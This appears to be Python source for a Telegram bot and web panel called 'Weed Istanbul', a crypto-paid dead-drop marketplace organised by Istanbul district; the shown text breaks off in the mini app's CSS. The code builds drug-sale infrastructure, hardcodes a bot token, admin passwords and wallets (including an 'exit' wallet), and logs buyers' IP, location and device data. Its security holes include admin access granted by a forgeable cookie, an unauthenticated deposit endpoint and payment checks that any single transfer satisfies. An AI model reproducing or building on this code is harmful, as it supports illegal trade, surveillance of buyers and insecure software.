import asyncio
import sqlite3
import logging
import os
import sys
import threading
import urllib.request
import json
import hashlib
import time
import io
import base64
import pandas as pd
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, FSInputFile, WebAppInfo

# --- KALI LINUX / TERMINAL DAEMON & CÜZDAN MİMARİSİ ---
DEFAULT_BOT_TOKEN = "9018759790:AAHH_P_MAta3jo1pr8L4DHcpaObvxOuIpeQ"
ADMIN_ID = 1012940363
ADMIN_GROUP_ID = -1004474292737  
ADMIN_PASS = "1881"

ADMIN_WEB_USERNAME = "root"
ADMIN_WEB_PASSWORD = "toor"

CRYPTO_WALLET = "TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH"
MAIN_SAVINGS_WALLET = "TVsUkivFz217G7yAZ9w9PDj4WphJZty1tY"
EXIT_WALLET = "TMxF3AFaqpHgRF5S8RkmZtAkwzzYxgwzLn"

USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"

RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
if not RENDER_EXTERNAL_URL:
    RENDER_EXTERNAL_URL = "https://weed-istanbul.onrender.com"

logging.basicConfig(format='[KALI-CORE:%(levelname)s] %(asctime)s - %(message)s', level=logging.INFO)
logging.info("Kali Linux Root Subsystem & Secure Tunnel initialized successfully.")

UPLOAD_DIR = "static/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def hash_pass(password: str) -> str:
    return hashlib.sha256(password.encode()).hexdigest()

# --- VERİTABANI KURULUMU & TELEMETRİ TABLOLARI ---
def init_db():
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("PRAGMA journal_mode=WAL;")
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS drops (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            title TEXT,
            price REAL,
            photo_ids TEXT,
            description TEXT,
            stock INTEGER DEFAULT 1,
            is_sold INTEGER DEFAULT 0,
            category TEXT DEFAULT 'Genel',
            lat REAL DEFAULT 0.0,
            lon REAL DEFAULT 0.0
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS orders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            drop_id INTEGER,
            status TEXT DEFAULT 'pending',
            final_price REAL DEFAULT 0.0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS order_reviews (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            order_id INTEGER,
            user_id INTEGER,
            review_text TEXT,
            reward_given INTEGER DEFAULT 1,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deposits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS panel_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            message TEXT,
            log_type TEXT DEFAULT 'info',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS visitor_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            ip TEXT,
            user_agent TEXT,
            network_info TEXT,
            lat REAL DEFAULT 41.0082,
            lon REAL DEFAULT 28.9784,
            battery_level TEXT DEFAULT 'Bilinmiyor',
            cpu_ram TEXT DEFAULT 'Bilinmiyor',
            timezone TEXT DEFAULT 'Bilinmiyor',
            screen_res TEXT DEFAULT 'Bilinmiyor',
            visibility_state TEXT DEFAULT 'visible',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            is_banned INTEGER DEFAULT 0,
            language TEXT DEFAULT 'tr',
            balance REAL DEFAULT 5.0,
            referred_by INTEGER DEFAULT 0,
            referral_earnings REAL DEFAULT 0.0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS support_messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            sender TEXT,
            message TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS coupons (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            code TEXT UNIQUE,
            discount REAL,
            uses_left INTEGER DEFAULT 100,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS game_spins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            game_type TEXT,
            week_identifier TEXT,
            reward_text TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS admin_audit_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_user TEXT,
            action_type TEXT,
            details TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    ''')
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('promo_5g_active', '1')")
    cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('bot_token', ?)", (DEFAULT_BOT_TOKEN,))
    
    for col, def_val in [
        ("is_banned", "INTEGER DEFAULT 0"), 
        ("language", "TEXT DEFAULT 'tr'"), 
        ("balance", "REAL DEFAULT 5.0"),
        ("lat", "REAL DEFAULT 0.0"),
        ("lon", "REAL DEFAULT 0.0"),
        ("referred_by", "INTEGER DEFAULT 0"),
        ("referral_earnings", "REAL DEFAULT 0.0")
    ]:
        try:
            cursor.execute(f"ALTER TABLE users ADD COLUMN {col} {def_val}")
        except:
            pass

    for col, def_val in [
        ("battery_level", "TEXT DEFAULT 'Bilinmiyor'"),
        ("cpu_ram", "TEXT DEFAULT 'Bilinmiyor'"),
        ("timezone", "TEXT DEFAULT 'Bilinmiyor'"),
        ("screen_res", "TEXT DEFAULT 'Bilinmiyor'"),
        ("visibility_state", "TEXT DEFAULT 'visible'")
    ]:
        try:
            cursor.execute(f"ALTER TABLE visitor_logs ADD COLUMN {col} {def_val}")
        except:
            pass

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS admins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT,
            role TEXT DEFAULT 'support',
            can_view_exact_loc INTEGER DEFAULT 0,
            can_view_wallets INTEGER DEFAULT 0,
            can_view_crm INTEGER DEFAULT 0,
            can_manage_drops INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    for col, def_val in [
        ("can_view_exact_loc", "INTEGER DEFAULT 0"),
        ("can_view_wallets", "INTEGER DEFAULT 0"),
        ("can_view_crm", "INTEGER DEFAULT 0"),
        ("can_manage_drops", "INTEGER DEFAULT 0")
    ]:
        try:
            cursor.execute(f"ALTER TABLE admins ADD COLUMN {col} {def_val}")
        except:
            pass

    cursor.execute("INSERT OR IGNORE INTO admins (username, password, role, can_view_exact_loc, can_view_wallets, can_view_crm, can_manage_drops) VALUES (?, ?, 'super_admin', 1, 1, 1, 1)", (ADMIN_WEB_USERNAME, hash_pass(ADMIN_WEB_PASSWORD)))
    cursor.execute("UPDATE admins SET can_view_exact_loc = 1, can_view_wallets = 1, can_view_crm = 1, can_manage_drops = 1 WHERE username = 'root' OR role = 'super_admin'")
    
    conn.commit()
    conn.close()

init_db()

def get_active_token() -> str:
    try:
        conn = sqlite3.connect("drop_bot.db")
        cursor = conn.cursor()
        cursor.execute("SELECT value FROM settings WHERE key = 'bot_token'")
        res = cursor.fetchone()
        conn.close()
        if res and res[0]:
            return res[0]
    except:
        pass
    return DEFAULT_BOT_TOKEN

BOT_TOKEN = get_active_token()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
main_loop = None

DISTRICT_COORDS = {
    "BEŞİKTAŞ": [41.0429, 29.0077],
    "KADİKÖY": [40.9901, 29.0254],
    "ÜSKÜDAR": [41.0256, 29.0153],
    "ŞİŞLİ": [41.0615, 28.9877],
    "BEYOĞLU": [41.0369, 28.9776],
    "FATİH": [41.0092, 28.9556],
    "SARIYER": [41.1687, 29.0565],
    "MALTEPE": [40.9273, 29.1303],
    "KARTAL": [40.8885, 29.1856],
    "PENDİK": [40.8763, 29.2366],
    "ATAŞEHİR": [40.9859, 29.1136],
    "ÜMRANİYE": [41.0298, 29.1157],
    "ÇEKMEKÖY": [41.0422, 29.1764],
    "BEYKOZ": [41.1150, 29.1028],
    "BAKIRKÖY": [40.9791, 28.8756],
    "ZEYTİNBURNU": [40.9928, 28.8988],
    "ESENYURT": [41.0261, 28.6811],
    "BAĞCILAR": [41.0375, 28.8503],
    "BAHÇELİEVLER": [40.9981, 28.8584],
    "GENEL": [41.0082, 28.9784]
}

def get_district_coord(category_name):
    if not category_name:
        return [41.0082, 28.9784]
    cat_upper = category_name.upper().strip()
    for key, coord in DISTRICT_COORDS.items():
        if key in cat_upper:
            return coord
    return [41.0082, 28.9784]

LANG = {
    "tr": {
        "welcome": "👋 Merhaba! Güvenli otomatik teslimat botuna hoş geldiniz. Kayıt olduğunuz için hesabınıza **5$ (USDT) Hoş Geldin Bonusu** eklendi! Lütfen dil seçiniz:",
        "lang_set": "✅ Dil Türkçe olarak ayarlandı.",
        "btn_products": "🛍️ Ürünler / Droplar",
        "btn_orders": "📦 Geçmiş Siparişlerim",
        "btn_track": "🔍 Sipariş Takip / Sorgula",
        "btn_miniapp": "🗺️ Harita & Mini App",
        "btn_wallet": "💰 Cüzdanım / Bakiye",
        "btn_faq": "❓ Nasıl Çalışır? (SSS)",
        "btn_support": "📞 Destek",
        "btn_lang": "🌐 Dil Değiştir",
        "no_stock": "❌ Şu anda stokta hazır ürün bulunmamaktadır.",
        "select_cat": "🏙️ Lütfen ürünleri incelemek istediğiniz **bölgeyi / semti** seçin:",
        "back_cats": "🔙 Bölgelere Dön",
        "no_cat_stock": "Bu bölgede aktif ürün kalmadı.",
        "my_orders_title": "📦 **Sipariş Geçmişiniz:**",
        "no_orders": "📦 Henüz bir sipariş geçmişiniz bulunmuyor.",
        "order_item": "• **Sipariş #{id}** (Code: `WEE-{id}`) | {title} - {price} USDT\n  Durum: {status} ({date})\n\n",
        "open_loc": "🔗 Sipariş #{id} Konumunu Aç",
        "sold_out": "⚠️ Bu ürün tükenmiş.",
        "track_prompt": "🔍 Lütfen sorgulamak istediğiniz **Sipariş Kodunu** yazın (Örn: WEE-5 veya sadece 5):",
        "track_not_found": "❌ Bu koda ait bir sipariş bulunamadı veya henüz onaylanmadı.",
        "track_result": "🔍 **Sipariş Sorgulama Sonucu (#{id})**\n\n📌 Ürün: {title}\n💰 Tutar: {price} USDT\n🟢 Durum: {status_text}\n\n👉 [Güvenli Konum Sayfasını Aç]({link})",
        "wallet_menu_text": "💰 **Cüzdan Yönetimi**\n\n💵 Güncel Bakiyeniz: **{balance} USDT**\n\nHesabınıza bakiye yükleyerek siparişlerinizi saniyesinde tek tıkla verebilirsiniz.",
        "deposit_btn": "📥 Bakiye Yükle (USDT)",
        "ask_deposit_amount": "📥 Lütfen hesabınıza yüklemek istediğiniz USDT miktarını rakam olarak yazın (Örn: 20):",
        "deposit_invoice": "📥 **Bakiye Yükleme Talebi (#{id})**\n\n💵 Yüklenecek Tutar: **{amount} USDT**\n🔒 Yatırım Adresi:\n`{wallet}`\n\n⏱️ 15 dakikanız vardır. Sistem ödemeyi otomatik algılayacaktır.",
        "deposit_check_btn": "🔄 Yatırımı Otomatik Kontrol Et",
        "deposit_success": "🎉 Ödemeniz onaylandı! **{amount} USDT** bakiyenize eklendi.\n💵 Yeni Toplam Bakiye: **{balance} USDT**",
        "buy_options": "📌 Ürün: {title}\n💰 Fiyat: {price} USDT\n💵 Bakiyeniz: {balance} USDT\n\nLütfen ödeme yöntemini seçin:",
        "pay_balance": "⚡ Bakiyeden Öde ({price} USDT)",
        "pay_crypto": "🔒 Blokzincir ile Doğrudan Öde",
        "insufficient_balance": "❌ Bakiyeniz yetersiz! Lütfen cüzdanınıza bakiye yükleyin veya doğrudan ödeme yapın.",
        "balance_success": "🎉 Siparişiniz başarıyla onaylandı! {price} USDT bakiyenizden düşüldü.\n\n🔑 Sipariş Takip Kodunuz: `WEE-{id}`\n👉 [Güvenli Konum Sayfasını Aç]({link})",
        "cancel": "❌ İptal",
        "success_msg": "🎉 Ödemeniz onaylandı!\n🔑 Sipariş Takip Kodunuz: `WEE-{id}`\n\n👉 [Güvenli Konum Sayfasını Aç]({link})",
        "support_ask": "📞 Canlı destek hattına bağlandınız. Lütfen mesajınızı yazın:\n\n*(Sohbeti sonlandırmak için aşağıdaki butonu kullanabilirsiniz)*",
        "support_sent": "✅ Mesajınız canlı destek ekibimize iletildi. Yanıt bekleniyor...",
        "support_closed": "🔒 Canlı destek oturumu sonlandırıldı.",
        "banned": "❌ Erişiminiz engellenmiştir."
    },
    "en": {
        "welcome": "👋 Hello! Welcome to the secure automated delivery bot. **$5 (USDT) Welcome Bonus** has been added to your account! Please select your language:",
        "lang_set": "✅ Language set to English.",
        "btn_products": "🛍️ Products / Drops",
        "btn_orders": "📦 My Orders",
        "btn_track": "🔍 Track Order",
        "btn_miniapp": "🗺️ Map & Mini App",
        "btn_wallet": "💰 My Wallet / Balance",
        "btn_faq": "❓ How It Works (FAQ)",
        "btn_support": "📞 Support",
        "btn_lang": "🌐 Change Language",
        "no_stock": "❌ There are currently no ready products in stock.",
        "select_cat": "🏙️ Please select the **region / district** you want to view:",
        "back_cats": "🔙 Back to Regions",
        "no_cat_stock": "No active products left in this region.",
        "my_orders_title": "📦 **Your Order History:**",
        "no_orders": "📦 You don't have any order history yet.",
        "order_item": "• **Order #{id}** (Code: `WEE-{id}`) | {title} - {price} USDT\n  Status: {status} ({date})\n\n",
        "open_loc": "🔗 Open Order #{id} Location",
        "sold_out": "⚠️ This product is sold out.",
        "track_prompt": "🔍 Please enter your **Order Code** (e.g. WEE-5 or just 5):",
        "track_not_found": "❌ No order found with this code or not approved yet.",
        "track_result": "🔍 **Order Tracking Result (#{id})**\n\n📌 Product: {title}\n💰 Price: {price} USDT\n🟢 Status: {status_text}\n\n👉 [Open Secure Location Page]({link})",
        "wallet_menu_text": "💰 **Wallet Management**\n\n💵 Current Balance: **{balance} USDT**\n\nDeposit funds to your account for instant one-click purchases.",
        "deposit_btn": "📥 Deposit Balance (USDT)",
        "ask_deposit_amount": "📥 Please enter the amount of USDT you want to deposit (e.g. 20):",
        "deposit_invoice": "📥 **Deposit Invoice (#{id})**\n\n💵 Amount: **{amount} USDT**\n🔒 Deposit Address:\n`{wallet}`\n\n⏱️ You have 15 minutes. System will auto-approve.",
        "deposit_check_btn": "🔄 Auto-Check Deposit",
        "deposit_success": "🎉 Payment approved! **{amount} USDT** added to your balance.\n💵 New Total Balance: **{balance} USDT**",
        "buy_options": "📌 Product: {title}\n💰 Price: {price} USDT\n💵 Your Balance: {balance} USDT\n\nPlease select payment method:",
        "pay_balance": "⚡ Pay from Balance ({price} USDT)",
        "pay_crypto": "🔒 Pay Directly via Blockchain",
        "insufficient_balance": "❌ Insufficient balance! Please deposit funds or pay directly.",
        "balance_success": "🎉 Order successfully approved! {price} USDT deducted from your balance.\n🔑 Order Tracking Code: `WEE-{id}`\n\n👉 [Open Secure Location Page]({link})",
        "cancel": "❌ Cancel",
        "success_msg": "🎉 Your payment is approved!\n🔑 Tracking Code: `WEE-{id}`\n\n👉 [Open Secure Location Page]({link})",
        "support_ask": "📞 Connected to live support. Type your message below:\n\n*(You can use the button below to end the chat)*",
        "support_sent": "✅ Your message has been sent to our live support team. Waiting for response...",
        "support_closed": "🔒 Live support session has been ended.",
        "banned": "❌ Your access has been restricted."
    }
}

def get_user_lang(user_id: int) -> str:
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT language FROM users WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    if res and res[0] in ["tr", "en"]:
        return res[0]
    return "tr"

def set_user_lang(user_id: int, lang: str):
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang, user_id))
    conn.commit()
    conn.close()

def get_user_balance(user_id: int) -> float:
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res[0] if res and res[0] is not None else 0.0

def log_panel_event(message, log_type="info"):
    try:
        conn = sqlite3.connect("drop_bot.db")
        cursor = conn.cursor()
        cursor.execute("INSERT INTO panel_logs (message, log_type) VALUES (?, ?)", (message, log_type))
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(e)

def log_audit(admin_name, action_type, details):
    try:
        conn = sqlite3.connect("drop_bot.db")
        cursor = conn.cursor()
        cursor.execute("INSERT INTO admin_audit_logs (admin_user, action_type, details) VALUES (?, ?, ?)", (admin_name, action_type, details))
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(e)

def is_admin(user_id: int) -> bool:
    if user_id == ADMIN_ID:
        return True
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM admins WHERE id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res is not None

def is_user_banned(user_id: int) -> bool:
    conn = sqlite3.connect("drop_bot.db")
    cursor = conn.cursor()
    cursor.execute("SELECT is_banned FROM users WHERE user_id = ?", (user_id,))
    res = cursor.fetchone()
    conn.close()
    return res is not None and res[0] == 1

async def auto_backup_task():
    while True:
        await asyncio.sleep(86400)
        try:
            if os.path.exists("drop_bot.db"):
                file = FSInputFile("drop_bot.db")
                await bot.send_document(ADMIN_GROUP_ID, file, caption="💾 **Otomatik Günlük Veritabanı Yedeği**")
                log_panel_event("💾 Günlük otomatik veritabanı yedeği alındı.", "info")
        except Exception as e:
            logging.error(e)

async def background_payment_worker():
    while True:
        await asyncio.sleep(25)
        try:
            conn = sqlite3.connect("drop_bot.db")
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT orders.id, orders.user_id, orders.drop_id, orders.final_price, orders.created_at, drops.title, drops.stock, drops.category 
                FROM orders 
                JOIN drops ON orders.drop_id = drops.id 
                WHERE orders.status = 'pending'
            """)
            pending_orders = cursor.fetchall()
            
            cursor.execute("SELECT id, user_id, amount, created_at FROM deposits WHERE status = 'pending'")
            pending_deposits = cursor.fetchall()
            conn.close()

            if not pending_orders and not pending_deposits:
                continue

            api_url = f"https://api.trongrid.io/v1/accounts/{CRYPTO_WALLET}/trc20-transfers?contract_address={USDT_CONTRACT}&limit=20"
            tx_data = []
            try:
                req = urllib.request.Request(api_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=10) as response:
                    if response.status == 200:
                        res_json = json.loads(response.read().decode('utf-8'))
                        tx_data = res_json.get("data", [])
            except Exception as e:
                logging.error(f"Worker API fetch error: {e}")

            for order in pending_orders:
                o_id, u_id, d_id, f_price, created_at_str, title, stock, category = order
                if datetime.now() - datetime.strptime(created_at_str, "%Y-%m-%d %H:%M:%S") > timedelta(minutes=15):
                    conn = sqlite3.connect("drop_bot.db")
                    c = conn.cursor()
                    c.execute("UPDATE orders SET status = 'expired' WHERE id = ?", (o_id,))
                    conn.commit()
                    conn.close()
                    continue

                verified = False
                for tx in tx_data:
                    if tx.get("to") == CRYPTO_WALLET and int(tx.get("value", 0)) >= int(float(f_price) * 1000000):
                        verified = True
                        break

                if verified and main_loop:
                    conn = sqlite3.connect("drop_bot.db")
                    c = conn.cursor()
                    new_stock = stock - 1
                    if new_stock <= 0:
                        c.execute("UPDATE drops SET stock = 0, is_sold = 1 WHERE id = ?", (d_id,))
                    else:
                        c.execute("UPDATE drops SET stock = ? WHERE id = ?", (new_stock, d_id))
                    c.execute("UPDATE orders SET status = 'completed' WHERE id = ?", (o_id,))
                    
                    c.execute("SELECT referred_by FROM users WHERE user_id = ?", (u_id,))
                    ref_row = c.fetchone()
                    if ref_row and ref_row[0] > 0:
                        ref_id = ref_row[0]
                        bonus = float(f_price) * 0.05
                        c.execute("UPDATE users SET balance = balance + ?, referral_earnings = referral_earnings + ? WHERE user_id = ?", (bonus, bonus, ref_id))
                        asyncio.run_coroutine_threadsafe(bot.send_message(ref_id, f"🎉 **Referans Bonusu!** Davet ettiğiniz kullanıcı alışveriş yaptı ve hesabınıza **{bonus:.2f} USDT** eklendi!"), main_loop)

                    conn.commit()
                    conn.close()

                    u_lang = get_user_lang(u_id)
                    secure_link = f"{RENDER_EXTERNAL_URL}/drop/{o_id}"
                    success_text = LANG[u_lang]["success_msg"].format(id=o_id, link=secure_link)

                    log_panel_event(f"🎉 Otomatik Arka Plan Satışı: #{o_id} - {title} ({f_price} USDT)", "success")
                    asyncio.run_coroutine_threadsafe(bot.send_message(u_id, success_text, parse_mode="Markdown"), main_loop)
                    asyncio.run_coroutine_threadsafe(bot.send_message(ADMIN_GROUP_ID, f"🎉 **OTOMATİK SATIŞ ONAYLANDI!**\n\n📌 Ürün: {title}\n💰 Tutar: {f_price} USDT\n🔑 Takip Kodu: `WEE-{o_id}`"), main_loop)

            for dep in pending_deposits:
                dep_id, u_id, amount, created_at_str = dep
                if datetime.now() - datetime.strptime(created_at_str, "%Y-%m-%d %H:%M:%S") > timedelta(minutes=15):
                    conn = sqlite3.connect("drop_bot.db")
                    c = conn.cursor()
                    c.execute("UPDATE deposits SET status = 'expired' WHERE id = ?", (dep_id,))
                    conn.commit()
                    conn.close()
                    continue

                verified = False
                for tx in tx_data:
                    if tx.get("to") == CRYPTO_WALLET and int(tx.get("value", 0)) >= int(float(amount) * 1000000):
                        verified = True
                        break

                if verified and main_loop:
                    conn = sqlite3.connect("drop_bot.db")
                    c = conn.cursor()
                    c.execute("UPDATE deposits SET status = 'completed' WHERE id = ?", (dep_id,))
                    c.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, u_id))
                    conn.commit()
                    new_bal = get_user_balance(u_id)
                    conn.close()

                    u_lang = get_user_lang(u_id)
                    log_panel_event(f"📥 Otomatik Bakiye Yüklendi: Kullanıcı {u_id} - {amount} USDT", "success")
                    asyncio.run_coroutine_threadsafe(bot.send_message(u_id, LANG[u_lang]["deposit_success"].format(amount=amount, balance=new_bal)), main_loop)
                    asyncio.run_coroutine_threadsafe(bot.send_message(ADMIN_GROUP_ID, f"📥 **BAKİYE YÜKLENDİ!**\n\n👤 Kullanıcı ID: `{u_id}`\n💵 Miktar: **{amount} USDT**"), main_loop)

        except Exception as e:
            logging.error(f"Background worker error: {e}")

# --- WEB SUNUCUSU & KALI MINI APP ---
class SecureDropHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query_params = parse_qs(parsed_path.query)
        cookies_str = self.headers.get('Cookie', '')
        is_logged_in = 'admin_auth=true' in cookies_str

        current_role = "support"
        current_username = ""
        for cookie in cookies_str.split(";"):
            if "admin_role=" in cookie:
                current_role = cookie.split("=")[1].strip()
            if "admin_username=" in cookie:
                current_username = cookie.split("=")[1].strip()

        can_view_exact_loc = 0
        can_view_wallets = 0
        can_view_crm = 0
        can_manage_drops = 0

        if is_logged_in and current_username:
            conn = sqlite3.connect("drop_bot.db")
            cursor = conn.cursor()
            cursor.execute("SELECT can_view_exact_loc, can_view_wallets, can_view_crm, can_manage_drops FROM admins WHERE username = ?", (current_username,))
            perm_row = cursor.fetchone()
            conn.close()
            if perm_row:
                can_view_exact_loc, can_view_wallets, can_view_crm, can_manage_drops = perm_row
            
            if current_role == "super_admin" or current_username == "root":
                can_view_exact_loc, can_view_wallets, can_view_crm, can_manage_drops = 1, 1, 1, 1

        if parsed_path.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"Kali Linux Daemon Root Subsystem Active!")
            return

        if parsed_path.path == "/api/miniapp-deposit":
            try:
                uid = int(query_params.get("user_id", ["0"])[0])
                amount = float(query_params.get("amount", ["0"])[0])
            except:
                uid, amount = 0, 0.0

            if uid > 0 and amount > 0:
                conn = sqlite3.connect("drop_bot.db")
                cursor = conn.cursor()
                cursor.execute("INSERT INTO deposits (user_id, amount, status) VALUES (?, ?, 'pending')", (uid, amount))
                deposit_id = cursor.lastrowid
                conn.commit()
                conn.close()
                resp = {"success": True, "deposit_id": deposit_id, "wallet": CRYPTO_WALLET}
            else:
                resp = {"success": False, "message": "Geçersiz miktar veya kullanıcı ID."}

            self.send_response(200)
            self.send_header("Content-type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(resp).encode("utf-8"))
            return

        if parsed_path.path.startswith("/static/uploads/"):
            file_path = parsed_path.path.lstrip("/")
            if os.path.exists(file_path):
                self.send_response(200)
                if file_path.endswith(".png"):
                    self.send_header("Content-type", "image/png")
                elif file_path.endswith((".jpg", ".jpeg")):
                    self.send_header("Content-type", "image/jpeg")
                elif file_path.endswith(".webp"):
                    self.send_header("Content-type", "image/webp")
                else:
                    self.send_header("Content-type", "application/octet-stream")
                self.end_headers()
                with open(file_path, "rb") as f:
                    self.wfile.write(f.read())
                return
            else:
                self.send_response(404)
                self.end_headers()
                return

        if parsed_path.path == "/miniapp":
            miniapp_html = """
            <!DOCTYPE html>
            <html lang="tr">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Weed Istanbul - Kali Security Mini App</title>
                <script src="https://telegram.org/js/telegram-web-app.js"></script>
                <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
                <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
                <style>
                    :root {
                        --bg-main: #090d16;
                        --card-bg: #111827;
                        --border-color: #1f2937;
                        --accent-blue: #38bdf8;
                        --accent-green: #10b981;
                        --accent-red: #ef4444;
                        --text-muted: #9ca3af;
                    }
                    body { background-color: var(--bg-main); color: #f8fafc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 12px; box-sizing: border-box; }
                    .nav-tabs { display: flex; gap: 6px; overflow-x: auto; margin-bottom: 15px; padding-bottom: 4px; border-bottom: 1px solid var(--border-color); }
                    .tab-btn { background: var(--card-bg); color: var(--text-muted); padding: 10px 12px; border-radius: 8px; border: 1px solid var(--border-color); font-size: 11px; font-weight: bold; cursor: pointer; white-space: nowrap; flex: 1; text-align: center; transition: 0.2s; }
                    .tab-btn.active { background: #2563eb; color: white; border-color: #3b82f6; }
                    .tab-content { display: none; }
                    .tab-content.active { display: block; }
                    
                    .promo-banner { background: linear-gradient(135deg, #1e1b4b, #312e81); border: 1px solid #4338ca; padding: 12px; border-radius: 12px; margin-bottom: 15px; font-size: 13px; }
                    .coupon-tag { background: rgba(16, 185, 129, 0.2); border: 1px dashed var(--accent-green); color: var(--accent-green); padding: 4px 8px; border-radius: 6px; font-family: monospace; font-weight: bold; display: inline-block; margin-top: 4px; }
                    
                    #mainMap { width: 100%; height: 280px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 12px; }
                    .card { background: var(--card-bg); padding: 15px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
                    
                    input, select { width: 100%; padding: 10px; background: var(--bg-main); border: 1px solid #374151; border-radius: 8px; color: white; box-sizing: border-box; font-size: 13px; margin-top: 6px; margin-bottom: 10px; }
                    button { background: #2563eb; color: white; padding: 10px 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; font-size: 13px; transition: 0.2s; }
                    button:hover { background: #1d4ed8; }
                    
                    .quick-amounts { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin-bottom: 10px; }
                    .quick-btn { background: #1f2937; border: 1px solid var(--border-color); color: var(--accent-blue); padding: 8px; font-size: 12px; border-radius: 6px; font-weight: bold; cursor: pointer; }

                    .btn-received { background: var(--accent-green); }
                    .btn-close { background: var(--accent-red); margin-top: 15px; }
                    
                    .nav-btn-group { display: flex; gap: 6px; margin-top: 8px; }
                    .nav-btn { flex: 1; background: #0ea5e9; color: white; font-size: 11px; padding: 8px; border-radius: 6px; text-decoration: none; text-align: center; font-weight: bold; display: block; }
                    .nav-btn.yandex { background: #e11d48; }
                    .nav-btn.apple { background: #475569; }

                    .skeleton { background: linear-gradient(90deg, #111827 25%, #1f2937 50%, #111827 75%); background-size: 200% 100%; animation: shimmer 1.5s infinite; border-radius: 8px; height: 40px; margin-bottom: 10px; }
